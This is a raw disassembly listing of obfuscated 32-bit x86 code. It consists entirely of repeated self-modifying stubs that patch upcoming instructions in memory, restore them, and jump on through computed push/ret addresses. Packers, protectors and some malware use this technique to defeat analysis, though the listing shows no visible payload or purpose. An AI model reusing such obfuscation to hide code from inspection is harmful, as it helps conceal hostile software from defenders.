  408ae8:	66 87 05 de 8a 40 00 	xchg   %ax,0x408ade
  408aef:	b8 47 41 87 46       	mov    $0x46874147,%eax
  408af4:	87 04 24             	xchg   %eax,(%esp)
  408af7:	c3                   	ret
  408af8:	8f 05 26 8b 40 00    	pop    0x408b26
  408afe:	50                   	push   %eax
  408aff:	8b 05 06 71 40 00    	mov    0x407106,%eax
  408b05:	8d 80 d3 35 6e ff    	lea    -0x91ca2d(%eax),%eax
  408b0b:	87 05 14 8b 40 00    	xchg   %eax,0x408b14
  408b11:	58                   	pop    %eax
  408b12:	f3 90                	pause
  408b14:	da a3 c8 0b ff 50    	fisubl 0x50ff0bc8(%ebx)
  408b1a:	66 b8 eb e8          	mov    $0xe8eb,%ax
  408b1e:	66 87 05 14 8b 40 00 	xchg   %ax,0x408b14
  408b25:	b8 e2 a7 28 66       	mov    $0x6628a7e2,%eax
  408b2a:	87 04 24             	xchg   %eax,(%esp)
  408b2d:	c3                   	ret
  408b2e:	8f 05 5d 8b 40 00    	pop    0x408b5d
  408b34:	50                   	push   %eax
  408b35:	8b 05 06 71 40 00    	mov    0x407106,%eax
  408b3b:	8d 80 ea 05 d0 51    	lea    0x51d005ea(%eax),%eax
  408b41:	87 05 4a 8b 40 00    	xchg   %eax,0x408b4a
  408b47:	58                   	pop    %eax
  408b48:	f3 90                	pause
  408b4a:	ed                   	in     (%dx),%eax
  408b4b:	0f f5 14 40          	pmaddwd (%eax,%eax,2),%mm2
  408b4f:	00 50 66             	add    %dl,0x66(%eax)
  408b52:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  408b57:	05 4a 8b 40 00       	add    $0x408b4a,%eax
  408b5c:	b8 09 c4 7c 4a       	mov    $0x4a7cc409,%eax
  408b61:	8d 40 01             	lea    0x1(%eax),%eax
  408b64:	87 04 24             	xchg   %eax,(%esp)
  408b67:	c3                   	ret
  408b68:	8f 05 96 8b 40 00    	pop    0x408b96
  408b6e:	50                   	push   %eax
  408b6f:	90                   	nop
  408b70:	b8 15 20 40 00       	mov    $0x402015,%eax
  408b75:	8d 80 d3 47 6d ff    	lea    -0x92b82d(%eax),%eax
  408b7b:	87 05 84 8b 40 00    	xchg   %eax,0x408b84
  408b81:	58                   	pop    %eax
  408b82:	f3 90                	pause
  408b84:	09 f8                	or     %edi,%eax
  408b86:	93                   	xchg   %eax,%ebx
  408b87:	ff                   	(bad)
  408b88:	ff 50 66             	call   *0x66(%eax)
  408b8b:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  408b90:	05 84 8b 40 00       	add    $0x408b84,%eax
  408b95:	b8 c8 97 e3 42       	mov    $0x42e397c8,%eax
  408b9a:	87 04 24             	xchg   %eax,(%esp)
  408b9d:	c3                   	ret
  408b9e:	8f 05 cc 8b 40 00    	pop    0x408bcc
  408ba4:	50                   	push   %eax
  408ba5:	8b 05 06 71 40 00    	mov    0x407106,%eax
  408bab:	8d 80 8c 54 17 40    	lea    0x4017548c(%eax),%eax
  408bb1:	87 05 ba 8b 40 00    	xchg   %eax,0x408bba
  408bb7:	58                   	pop    %eax
  408bb8:	f3 90                	pause
  408bba:	80 04 78 0d          	addb   $0xd,(%eax,%edi,2)
  408bbe:	00 50 66             	add    %dl,0x66(%eax)
  408bc1:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  408bc6:	05 ba 8b 40 00       	add    $0x408bba,%eax
  408bcb:	b8 7b 4a cd 60       	mov    $0x60cd4a7b,%eax
  408bd0:	87 04 24             	xchg   %eax,(%esp)
  408bd3:	c3                   	ret
  408bd4:	8f 05 02 8c 40 00    	pop    0x408c02
  408bda:	50                   	push   %eax
  408bdb:	8b 05 06 71 40 00    	mov    0x407106,%eax
  408be1:	8d 80 8e 54 17 40    	lea    0x4017548e(%eax),%eax
  408be7:	87 05 f0 8b 40 00    	xchg   %eax,0x408bf0
  408bed:	58                   	pop    %eax
  408bee:	f3 90                	pause
  408bf0:	72 23                	jb     0x408c15
  408bf2:	c2 c2 00             	ret    $0xc2
  408bf5:	50                   	push   %eax
  408bf6:	66 b8 eb e8          	mov    $0xe8eb,%ax
  408bfa:	66 87 05 f0 8b 40 00 	xchg   %ax,0x408bf0
  408c01:	b8 ad 25 67 91       	mov    $0x916725ad,%eax
  408c06:	87 04 24             	xchg   %eax,(%esp)
  408c09:	c3                   	ret
  408c0a:	8f 05 38 8c 40 00    	pop    0x408c38
  408c10:	50                   	push   %eax
  408c11:	8b 05 06 71 40 00    	mov    0x407106,%eax
  408c17:	8d 80 d3 29 6d ff    	lea    -0x92d62d(%eax),%eax
  408c1d:	87 05 26 8c 40 00    	xchg   %eax,0x408c26
  408c23:	58                   	pop    %eax
  408c24:	f3 90                	pause
  408c26:	a0 70 d2 24 ff       	mov    0xff24d270,%al
  408c2b:	50                   	push   %eax
  408c2c:	66 b8 eb e8          	mov    $0xe8eb,%ax
  408c30:	66 87 05 26 8c 40 00 	xchg   %ax,0x408c26
  408c37:	b8 5c 2e 8a e9       	mov    $0xe98a2e5c,%eax
  408c3c:	87 04 24             	xchg   %eax,(%esp)
  408c3f:	c3                   	ret
  408c40:	8f 05 6f 8c 40 00    	pop    0x408c6f
  408c46:	50                   	push   %eax
  408c47:	8b 05 06 71 40 00    	mov    0x407106,%eax
  408c4d:	8d 80 ea 05 d4 51    	lea    0x51d405ea(%eax),%eax
  408c53:	87 05 5c 8c 40 00    	xchg   %eax,0x408c5c
  408c59:	58                   	pop    %eax
  408c5a:	f3 90                	pause
  408c5c:	1b 85 e8 4d 40 00    	sbb    0x404de8(%ebp),%eax
  408c62:	50                   	push   %eax
  408c63:	66 b8 eb e8          	mov    $0xe8eb,%ax
  408c67:	66 87 05 5c 8c 40 00 	xchg   %ax,0x408c5c
  408c6e:	b8 7b a7 7b 67       	mov    $0x677ba77b,%eax
  408c73:	8d 40 01             	lea    0x1(%eax),%eax
  408c76:	87 04 24             	xchg   %eax,(%esp)
  408c79:	c3                   	ret
  408c7a:	8f 05 a9 8c 40 00    	pop    0x408ca9
  408c80:	50                   	push   %eax
  408c81:	8b 05 06 71 40 00    	mov    0x407106,%eax
  408c87:	8d 80 ea e5 33 57    	lea    0x5733e5ea(%eax),%eax
  408c8d:	87 05 96 8c 40 00    	xchg   %eax,0x408c96
  408c93:	58                   	pop    %eax
  408c94:	f3 90                	pause
  408c96:	06                   	push   %es
  408c97:	a9 bb 3f 40 00       	test   $0x403fbb,%eax
  408c9c:	50                   	push   %eax
  408c9d:	66 b8 eb e8          	mov    $0xe8eb,%ax
  408ca1:	66 87 05 96 8c 40 00 	xchg   %ax,0x408c96
  408ca8:	b8 79 1e af 2f       	mov    $0x2faf1e79,%eax
  408cad:	8d 40 01             	lea    0x1(%eax),%eax
  408cb0:	87 04 24             	xchg   %eax,(%esp)
  408cb3:	c3                   	ret
  408cb4:	8f 05 e2 8c 40 00    	pop    0x408ce2
  408cba:	50                   	push   %eax
  408cbb:	8b 05 06 71 40 00    	mov    0x407106,%eax
  408cc1:	8d 80 53 df bf ff    	lea    -0x4020ad(%eax),%eax
  408cc7:	87 05 d0 8c 40 00    	xchg   %eax,0x408cd0
  408ccd:	58                   	pop    %eax
  408cce:	f3 90                	pause
  408cd0:	76 ee                	jbe    0x408cc0
  408cd2:	5f                   	pop    %edi
  408cd3:	6c                   	insb   (%dx),%es:(%edi)
  408cd4:	ff 50 66             	call   *0x66(%eax)
  408cd7:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  408cdc:	05 d0 8c 40 00       	add    $0x408cd0,%eax
  408ce1:	b8 ac da ab 14       	mov    $0x14abdaac,%eax
  408ce6:	87 04 24             	xchg   %eax,(%esp)
  408ce9:	c3                   	ret
  408cea:	8f 05 19 8d 40 00    	pop    0x408d19
  408cf0:	50                   	push   %eax
  408cf1:	8b 05 06 71 40 00    	mov    0x407106,%eax
  408cf7:	8d 80 76 f5 33 50    	lea    0x5033f576(%eax),%eax
  408cfd:	87 05 06 8d 40 00    	xchg   %eax,0x408d06
  408d03:	58                   	pop    %eax
  408d04:	f3 90                	pause
  408d06:	af                   	scas   %es:(%edi),%eax
  408d07:	3e fd                	ds std
  408d09:	6b 40 00 50          	imul   $0x50,0x0(%eax),%eax
  408d0d:	66 b8 eb e8          	mov    $0xe8eb,%ax
  408d11:	66 87 05 06 8d 40 00 	xchg   %ax,0x408d06
  408d18:	b8 55 d8 45 10       	mov    $0x1045d855,%eax
  408d1d:	8d 40 01             	lea    0x1(%eax),%eax
  408d20:	87 04 24             	xchg   %eax,(%esp)
  408d23:	c3                   	ret
  408d24:	8f 05 52 8d 40 00    	pop    0x408d52
  408d2a:	50                   	push   %eax
  408d2b:	8b 05 06 71 40 00    	mov    0x407106,%eax
  408d31:	8d 80 d3 4b 57 ff    	lea    -0xa8b42d(%eax),%eax
  408d37:	87 05 40 8d 40 00    	xchg   %eax,0x408d40
  408d3d:	58                   	pop    %eax
  408d3e:	f3 90                	pause
  408d40:	37                   	aaa
  408d41:	f4                   	hlt
  408d42:	64 50                	fs push %eax
  408d44:	ff 50 66             	call   *0x66(%eax)
  408d47:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  408d4c:	05 40 8d 40 00       	add    $0x408d40,%eax
  408d51:	b8 8b d4 ec fc       	mov    $0xfcecd48b,%eax
  408d56:	87 04 24             	xchg   %eax,(%esp)
  408d59:	c3                   	ret
  408d5a:	8f 05 88 8d 40 00    	pop    0x408d88
  408d60:	50                   	push   %eax
  408d61:	90                   	nop
  408d62:	b8 15 20 40 00       	mov    $0x402015,%eax
  408d67:	8d 80 a3 e1 bf ff    	lea    -0x401e5d(%eax),%eax
  408d6d:	87 05 76 8d 40 00    	xchg   %eax,0x408d76
  408d73:	58                   	pop    %eax
  408d74:	f3 90                	pause
  408d76:	43                   	inc    %ebx
  408d77:	2a a5 14 00 50 66    	sub    0x66500014(%ebp),%ah
  408d7d:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  408d82:	05 76 8d 40 00       	add    $0x408d76,%eax
  408d87:	b8 f8 b7 b1 90       	mov    $0x90b1b7f8,%eax
  408d8c:	87 04 24             	xchg   %eax,(%esp)
  408d8f:	c3                   	ret
  408d90:	8f 05 be 8d 40 00    	pop    0x408dbe
  408d96:	50                   	push   %eax
  408d97:	90                   	nop
  408d98:	b8 15 20 40 00       	mov    $0x402015,%eax
  408d9d:	8d 80 d3 9f 55 ff    	lea    -0xaa602d(%eax),%eax
  408da3:	87 05 ac 8d 40 00    	xchg   %eax,0x408dac
  408da9:	58                   	pop    %eax
  408daa:	f3 90                	pause
  408dac:	d5 19                	aad    $0x19
  408dae:	63 b4 ff 50 66 b8 eb 	arpl   %esi,-0x144799b0(%edi,%edi,8)
  408db5:	e8 66 87 05 ac       	call   0xac461520
  408dba:	8d 40 00             	lea    0x0(%eax),%eax
  408dbd:	b8 d5 57 b6 5b       	mov    $0x5bb657d5,%eax
  408dc2:	87 04 24             	xchg   %eax,(%esp)
  408dc5:	c3                   	ret
  408dc6:	8f 05 f5 8d 40 00    	pop    0x408df5
  408dcc:	50                   	push   %eax
  408dcd:	90                   	nop
  408dce:	b8 15 20 40 00       	mov    $0x402015,%eax
  408dd3:	8d 80 76 ed 3b 57    	lea    0x573bed76(%eax),%eax
  408dd9:	87 05 e2 8d 40 00    	xchg   %eax,0x408de2
  408ddf:	58                   	pop    %eax
  408de0:	f3 90                	pause
  408de2:	14 1e                	adc    $0x1e,%al
  408de4:	aa                   	stos   %al,%es:(%edi)
  408de5:	fd                   	std
  408de6:	40                   	inc    %eax
  408de7:	00 50 66             	add    %dl,0x66(%eax)
  408dea:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  408def:	05 e2 8d 40 00       	add    $0x408de2,%eax
  408df4:	b8 37 de b5 c2       	mov    $0xc2b5de37,%eax
  408df9:	8d 40 01             	lea    0x1(%eax),%eax
  408dfc:	87 04 24             	xchg   %eax,(%esp)
  408dff:	c3                   	ret
  408e00:	8f 05 2e 8e 40 00    	pop    0x408e2e
  408e06:	50                   	push   %eax
  408e07:	8b 05 06 71 40 00    	mov    0x407106,%eax
  408e0d:	8d 80 d3 56 65 ff    	lea    -0x9aa92d(%eax),%eax
  408e13:	87 05 1c 8e 40 00    	xchg   %eax,0x408e1c
  408e19:	58                   	pop    %eax
  408e1a:	f3 90                	pause
  408e1c:	2e 16                	cs push %ss
  408e1e:	61                   	popa
  408e1f:	ad                   	lods   %ds:(%esi),%eax
  408e20:	ff 50 66             	call   *0x66(%eax)
  408e23:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  408e28:	05 1c 8e 40 00       	add    $0x408e1c,%eax
  408e2d:	b8 d7 6c 33 7e       	mov    $0x7e336cd7,%eax
  408e32:	87 04 24             	xchg   %eax,(%esp)
  408e35:	c3                   	ret
  408e36:	8f 05 65 8e 40 00    	pop    0x408e65
  408e3c:	50                   	push   %eax
  408e3d:	8b 05 06 71 40 00    	mov    0x407106,%eax
  408e43:	8d 80 ea 15 78 56    	lea    0x567815ea(%eax),%eax
  408e49:	87 05 52 8e 40 00    	xchg   %eax,0x408e52
  408e4f:	58                   	pop    %eax
  408e50:	f3 90                	pause
  408e52:	0d ac be 2c 40       	or     $0x402cbeac,%eax
  408e57:	00 50 66             	add    %dl,0x66(%eax)
  408e5a:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  408e5f:	05 52 8e 40 00       	add    $0x408e52,%eax
  408e64:	b8 87 a3 68 3b       	mov    $0x3b68a387,%eax
  408e69:	8d 40 01             	lea    0x1(%eax),%eax
  408e6c:	87 04 24             	xchg   %eax,(%esp)
  408e6f:	c3                   	ret
  408e70:	8f 05 9f 8e 40 00    	pop    0x408e9f
  408e76:	50                   	push   %eax
  408e77:	8b 05 06 71 40 00    	mov    0x407106,%eax
  408e7d:	8d 80 ea f5 6f 52    	lea    0x526ff5ea(%eax),%eax
  408e83:	87 05 8c 8e 40 00    	xchg   %eax,0x408e8c
  408e89:	58                   	pop    %eax
  408e8a:	f3 90                	pause
  408e8c:	94                   	xchg   %eax,%esp
  408e8d:	8b b3 c8 40 00 50    	mov    0x500040c8(%ebx),%esi
  408e93:	66 b8 eb e8          	mov    $0xe8eb,%ax
  408e97:	66 87 05 8c 8e 40 00 	xchg   %ax,0x408e8c
  408e9e:	b8 dd 77 5a 4d       	mov    $0x4d5a77dd,%eax
  408ea3:	8d 40 01             	lea    0x1(%eax),%eax
  408ea6:	87 04 24             	xchg   %eax,(%esp)
  408ea9:	c3                   	ret
  408eaa:	8f 05 d8 8e 40 00    	pop    0x408ed8
  408eb0:	50                   	push   %eax
  408eb1:	90                   	nop
  408eb2:	b8 15 20 40 00       	mov    $0x402015,%eax
  408eb7:	8d 80 d3 82 66 ff    	lea    -0x997d2d(%eax),%eax
  408ebd:	87 05 c6 8e 40 00    	xchg   %eax,0x408ec6
  408ec3:	58                   	pop    %eax
  408ec4:	f3 90                	pause
  408ec6:	f9                   	stc
  408ec7:	7b bb                	jnp    0x408e84
  408ec9:	97                   	xchg   %eax,%edi
  408eca:	ff 50 66             	call   *0x66(%eax)
  408ecd:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  408ed2:	05 c6 8e 40 00       	add    $0x408ec6,%eax
  408ed7:	b8 0a d0 da 98       	mov    $0x98dad00a,%eax
  408edc:	87 04 24             	xchg   %eax,(%esp)
  408edf:	c3                   	ret
  408ee0:	8f 05 0f 8f 40 00    	pop    0x408f0f
  408ee6:	50                   	push   %eax
  408ee7:	90                   	nop
  408ee8:	b8 15 20 40 00       	mov    $0x402015,%eax
  408eed:	8d 80 ea 15 78 56    	lea    0x567815ea(%eax),%eax
  408ef3:	87 05 fc 8e 40 00    	xchg   %eax,0x408efc
  408ef9:	58                   	pop    %eax
  408efa:	f3 90                	pause
  408efc:	6e                   	outsb  %ds:(%esi),(%dx)
  408efd:	78 87                	js     0x408e86
  408eff:	47                   	inc    %edi
  408f00:	40                   	inc    %eax
  408f01:	00 50 66             	add    %dl,0x66(%eax)
  408f04:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  408f09:	05 fc 8e 40 00       	add    $0x408efc,%eax
  408f0e:	b8 0a 8d 4c aa       	mov    $0xaa4c8d0a,%eax
  408f13:	8d 40 01             	lea    0x1(%eax),%eax
  408f16:	87 04 24             	xchg   %eax,(%esp)
  408f19:	c3                   	ret
  408f1a:	8f 05 49 8f 40 00    	pop    0x408f49
  408f20:	50                   	push   %eax
  408f21:	90                   	nop
  408f22:	b8 15 20 40 00       	mov    $0x402015,%eax
  408f27:	8d 80 ea f5 03 52    	lea    0x5203f5ea(%eax),%eax
  408f2d:	87 05 36 8f 40 00    	xchg   %eax,0x408f36
  408f33:	58                   	pop    %eax
  408f34:	f3 90                	pause
  408f36:	ff ce                	dec    %esi
  408f38:	57                   	push   %edi
  408f39:	8f 40 00             	pop    0x0(%eax)
  408f3c:	50                   	push   %eax
  408f3d:	66 b8 eb e8          	mov    $0xe8eb,%ax
  408f41:	66 87 05 36 8f 40 00 	xchg   %ax,0x408f36
  408f48:	b8 2b 06 40 e1       	mov    $0xe140062b,%eax
  408f4d:	8d 40 01             	lea    0x1(%eax),%eax
  408f50:	87 04 24             	xchg   %eax,(%esp)
  408f53:	c3                   	ret
  408f54:	8f 05 82 8f 40 00    	pop    0x408f82
  408f5a:	50                   	push   %eax
  408f5b:	90                   	nop
  408f5c:	b8 15 20 40 00       	mov    $0x402015,%eax
  408f61:	8d 80 6e 5c e4 17    	lea    0x17e45c6e(%eax),%eax
  408f67:	87 05 70 8f 40 00    	xchg   %eax,0x408f70
  408f6d:	58                   	pop    %eax
  408f6e:	f3 90                	pause
  408f70:	e5 d3                	in     $0xd3,%eax
  408f72:	25 8e ff 50 66       	and    $0x6650ff8e,%eax
  408f77:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  408f7c:	05 70 8f 40 00       	add    $0x408f70,%eax
  408f81:	b8 fb 98 83 2b       	mov    $0x2b8398fb,%eax
  408f86:	87 04 24             	xchg   %eax,(%esp)
  408f89:	c3                   	ret
  408f8a:	8f 05 b9 8f 40 00    	pop    0x408fb9
  408f90:	50                   	push   %eax
  408f91:	8b 05 06 71 40 00    	mov    0x407106,%eax
  408f97:	8d 80 76 ed 3b 57    	lea    0x573bed76(%eax),%eax
  408f9d:	87 05 a6 8f 40 00    	xchg   %eax,0x408fa6
  408fa3:	58                   	pop    %eax
  408fa4:	f3 90                	pause
  408fa6:	fb                   	sti
  408fa7:	06                   	push   %es
  408fa8:	47                   	inc    %edi
  408fa9:	cb                   	lret
  408faa:	40                   	inc    %eax
  408fab:	00 50 66             	add    %dl,0x66(%eax)
  408fae:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  408fb3:	05 a6 8f 40 00       	add    $0x408fa6,%eax
  408fb8:	b8 75 0b 98 76       	mov    $0x76980b75,%eax
  408fbd:	8d 40 01             	lea    0x1(%eax),%eax
  408fc0:	87 04 24             	xchg   %eax,(%esp)
  408fc3:	c3                   	ret
  408fc4:	8f 05 f2 8f 40 00    	pop    0x408ff2
  408fca:	50                   	push   %eax
  408fcb:	8b 05 06 71 40 00    	mov    0x407106,%eax
  408fd1:	8d 80 d3 21 64 ff    	lea    -0x9bde2d(%eax),%eax
  408fd7:	87 05 e0 8f 40 00    	xchg   %eax,0x408fe0
  408fdd:	58                   	pop    %eax
  408fde:	f3 90                	pause
  408fe0:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  408fe1:	4c                   	dec    %esp
  408fe2:	89 f4                	mov    %esi,%esp
  408fe4:	ff 50 66             	call   *0x66(%eax)
  408fe7:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  408fec:	05 e0 8f 40 00       	add    $0x408fe0,%eax
  408ff1:	b8 a1 f2 94 9d       	mov    $0x9d94f2a1,%eax
  408ff6:	87 04 24             	xchg   %eax,(%esp)
  408ff9:	c3                   	ret
  408ffa:	8f 05 28 90 40 00    	pop    0x409028
  409000:	50                   	push   %eax
  409001:	90                   	nop
  409002:	b8 15 20 40 00       	mov    $0x402015,%eax
  409007:	8d 80 d3 5f 65 ff    	lea    -0x9aa02d(%eax),%eax
  40900d:	87 05 16 90 40 00    	xchg   %eax,0x409016
  409013:	58                   	pop    %eax
  409014:	f3 90                	pause
  409016:	8b c3                	mov    %ebx,%eax
  409018:	b4 c0                	mov    $0xc0,%ah
  40901a:	ff 50 66             	call   *0x66(%eax)
  40901d:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  409022:	05 16 90 40 00       	add    $0x409016,%eax
  409027:	b8 4d af 18 db       	mov    $0xdb18af4d,%eax
  40902c:	87 04 24             	xchg   %eax,(%esp)
  40902f:	c3                   	ret
  409030:	8f 05 5f 90 40 00    	pop    0x40905f
  409036:	50                   	push   %eax
  409037:	90                   	nop
  409038:	b8 15 20 40 00       	mov    $0x402015,%eax
  40903d:	8d 80 ea 15 78 56    	lea    0x567815ea(%eax),%eax
  409043:	87 05 4c 90 40 00    	xchg   %eax,0x40904c
  409049:	58                   	pop    %eax
  40904a:	f3 90                	pause
  40904c:	68 e3 1b 63 40       	push   $0x40631be3
  409051:	00 50 66             	add    %dl,0x66(%eax)
  409054:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  409059:	05 4c 90 40 00       	add    $0x40904c,%eax
  40905e:	b8 14 ad 0e 58       	mov    $0x580ead14,%eax
  409063:	8d 40 01             	lea    0x1(%eax),%eax
  409066:	87 04 24             	xchg   %eax,(%esp)
  409069:	c3                   	ret
  40906a:	8f 05 99 90 40 00    	pop    0x409099
  409070:	50                   	push   %eax
  409071:	90                   	nop
  409072:	b8 15 20 40 00       	mov    $0x402015,%eax
  409077:	8d 80 ea f5 07 52    	lea    0x5207f5ea(%eax),%eax
  40907d:	87 05 86 90 40 00    	xchg   %eax,0x409086
  409083:	58                   	pop    %eax
  409084:	f3 90                	pause
  409086:	35 35 6f 40 40       	xor    $0x40406f35,%eax
  40908b:	00 50 66             	add    %dl,0x66(%eax)
  40908e:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  409093:	05 86 90 40 00       	add    $0x409086,%eax
  409098:	b8 9f 4d e2 76       	mov    $0x76e24d9f,%eax
  40909d:	8d 40 01             	lea    0x1(%eax),%eax
  4090a0:	87 04 24             	xchg   %eax,(%esp)
  4090a3:	c3                   	ret
  4090a4:	8f 05 d2 90 40 00    	pop    0x4090d2
  4090aa:	50                   	push   %eax
  4090ab:	90                   	nop
  4090ac:	b8 15 20 40 00       	mov    $0x402015,%eax
  4090b1:	8d 80 d3 2b 4f ff    	lea    -0xb0d42d(%eax),%eax
  4090b7:	87 05 c0 90 40 00    	xchg   %eax,0x4090c0
  4090bd:	58                   	pop    %eax
  4090be:	f3 90                	pause
  4090c0:	b0 c7                	mov    $0xc7,%al
  4090c2:	bb 28 ff 50 66       	mov    $0x6650ff28,%ebx
  4090c7:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  4090cc:	05 c0 90 40 00       	add    $0x4090c0,%eax
  4090d1:	b8 0e 58 ca 72       	mov    $0x72ca580e,%eax
  4090d6:	87 04 24             	xchg   %eax,(%esp)
  4090d9:	c3                   	ret
  4090da:	8f 05 08 91 40 00    	pop    0x409108
  4090e0:	50                   	push   %eax
  4090e1:	90                   	nop
  4090e2:	b8 15 20 40 00       	mov    $0x402015,%eax
  4090e7:	8d 80 8c 58 10 40    	lea    0x4010588c(%eax),%eax
  4090ed:	87 05 f6 90 40 00    	xchg   %eax,0x4090f6
  4090f3:	58                   	pop    %eax
  4090f4:	f3 90                	pause
  4090f6:	b8 45 32 de 00       	mov    $0xde3245,%eax
  4090fb:	50                   	push   %eax
  4090fc:	66 b8 eb e8          	mov    $0xe8eb,%ax
  409100:	66 87 05 f6 90 40 00 	xchg   %ax,0x4090f6
  409107:	b8 ab 18 74 a4       	mov    $0xa47418ab,%eax
  40910c:	87 04 24             	xchg   %eax,(%esp)
  40910f:	c3                   	ret
  409110:	8f 05 3e 91 40 00    	pop    0x40913e
  409116:	50                   	push   %eax
  409117:	90                   	nop
  409118:	b8 15 20 40 00       	mov    $0x402015,%eax
  40911d:	8d 80 6e 5c e4 17    	lea    0x17e45c6e(%eax),%eax
  409123:	87 05 2c 91 40 00    	xchg   %eax,0x40912c
  409129:	58                   	pop    %eax
  40912a:	f3 90                	pause
  40912c:	8a e0                	mov    %al,%ah
  40912e:	7a ce                	jp     0x4090fe
  409130:	ff 50 66             	call   *0x66(%eax)
  409133:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  409138:	05 2c 91 40 00       	add    $0x40912c,%eax
  40913d:	b8 82 9f 0b 6c       	mov    $0x6c0b9f82,%eax
  409142:	87 04 24             	xchg   %eax,(%esp)
  409145:	c3                   	ret
  409146:	8f 05 74 91 40 00    	pop    0x409174
  40914c:	50                   	push   %eax
  40914d:	8b 05 06 71 40 00    	mov    0x407106,%eax
  409153:	8d 80 8c 58 10 40    	lea    0x4010588c(%eax),%eax
  409159:	87 05 62 91 40 00    	xchg   %eax,0x409162
  40915f:	58                   	pop    %eax
  409160:	f3 90                	pause
  409162:	cb                   	lret
  409163:	4d                   	dec    %ebp
  409164:	25 78 00 50 66       	and    $0x66500078,%eax
  409169:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40916e:	05 62 91 40 00       	add    $0x409162,%eax
  409173:	b8 9d 3c ec 26       	mov    $0x26ec3c9d,%eax
  409178:	87 04 24             	xchg   %eax,(%esp)
  40917b:	c3                   	ret
  40917c:	8f 05 ac 91 40 00    	pop    0x4091ac
  409182:	50                   	push   %eax
  409183:	8b 05 06 71 40 00    	mov    0x407106,%eax
  409189:	8d 80 b2 27 d4 00    	lea    0xd427b2(%eax),%eax
  40918f:	87 05 98 91 40 00    	xchg   %eax,0x409198
  409195:	58                   	pop    %eax
  409196:	f3 90                	pause
  409198:	8b a1 ee 4f 00 00    	mov    0x4fee(%ecx),%esp
  40919e:	00 50 66             	add    %dl,0x66(%eax)
  4091a1:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  4091a6:	05 98 91 40 00       	add    $0x409198,%eax
  4091ab:	b8 19 da 5c 72       	mov    $0x725cda19,%eax
  4091b0:	8d 40 02             	lea    0x2(%eax),%eax
  4091b3:	87 04 24             	xchg   %eax,(%esp)
  4091b6:	c3                   	ret
  4091b7:	8f 05 e6 91 40 00    	pop    0x4091e6
  4091bd:	50                   	push   %eax
  4091be:	90                   	nop
  4091bf:	b8 15 20 40 00       	mov    $0x402015,%eax
  4091c4:	8d 80 76 f5 77 56    	lea    0x5677f576(%eax),%eax
  4091ca:	87 05 d3 91 40 00    	xchg   %eax,0x4091d3
  4091d0:	58                   	pop    %eax
  4091d1:	f3 90                	pause
  4091d3:	30 68 51             	xor    %ch,0x51(%eax)
  4091d6:	52                   	push   %edx
  4091d7:	40                   	inc    %eax
  4091d8:	00 50 66             	add    %dl,0x66(%eax)
  4091db:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  4091e0:	05 d3 91 40 00       	add    $0x4091d3,%eax
  4091e5:	b8 b7 c1 42 4e       	mov    $0x4e42c1b7,%eax
  4091ea:	8d 40 01             	lea    0x1(%eax),%eax
  4091ed:	87 04 24             	xchg   %eax,(%esp)
  4091f0:	c3                   	ret
  4091f1:	8f 05 20 92 40 00    	pop    0x409220
  4091f7:	50                   	push   %eax
  4091f8:	90                   	nop
  4091f9:	b8 15 20 40 00       	mov    $0x402015,%eax
  4091fe:	8d 80 ea f5 03 52    	lea    0x5203f5ea(%eax),%eax
  409204:	87 05 0d 92 40 00    	xchg   %eax,0x40920d
  40920a:	58                   	pop    %eax
  40920b:	f3 90                	pause
  40920d:	74 8f                	je     0x40919e
  40920f:	fa                   	cli
  409210:	36 40                	ss inc %eax
  409212:	00 50 66             	add    %dl,0x66(%eax)
  409215:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40921a:	05 0d 92 40 00       	add    $0x40920d,%eax
  40921f:	b8 da 6e e9 85       	mov    $0x85e96eda,%eax
  409224:	8d 40 01             	lea    0x1(%eax),%eax
  409227:	87 04 24             	xchg   %eax,(%esp)
  40922a:	c3                   	ret
  40922b:	8f 05 5a 92 40 00    	pop    0x40925a
  409231:	50                   	push   %eax
  409232:	8b 05 06 71 40 00    	mov    0x407106,%eax
  409238:	8d 80 76 0d 14 52    	lea    0x52140d76(%eax),%eax
  40923e:	87 05 47 92 40 00    	xchg   %eax,0x409247
  409244:	58                   	pop    %eax
  409245:	f3 90                	pause
  409247:	e6 b7                	out    %al,$0xb7
  409249:	35 dd 40 00 50       	xor    $0x500040dd,%eax
  40924e:	66 b8 eb e8          	mov    $0xe8eb,%ax
  409252:	66 87 05 47 92 40 00 	xchg   %ax,0x409247
  409259:	b8 7e fb 0b 33       	mov    $0x330bfb7e,%eax
  40925e:	8d 40 01             	lea    0x1(%eax),%eax
  409261:	87 04 24             	xchg   %eax,(%esp)
  409264:	c3                   	ret
  409265:	8f 05 93 92 40 00    	pop    0x409293
  40926b:	50                   	push   %eax
  40926c:	8b 05 06 71 40 00    	mov    0x407106,%eax
  409272:	8d 80 53 60 c0 ff    	lea    -0x3f9fad(%eax),%eax
  409278:	87 05 81 92 40 00    	xchg   %eax,0x409281
  40927e:	58                   	pop    %eax
  40927f:	f3 90                	pause
  409281:	7d 6c                	jge    0x4092ef
  409283:	1d c1 00 50 66       	sbb    $0x665000c1,%eax
  409288:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40928d:	05 81 92 40 00       	add    $0x409281,%eax
  409292:	b8 4e e2 c0 87       	mov    $0x87c0e24e,%eax
  409297:	87 04 24             	xchg   %eax,(%esp)
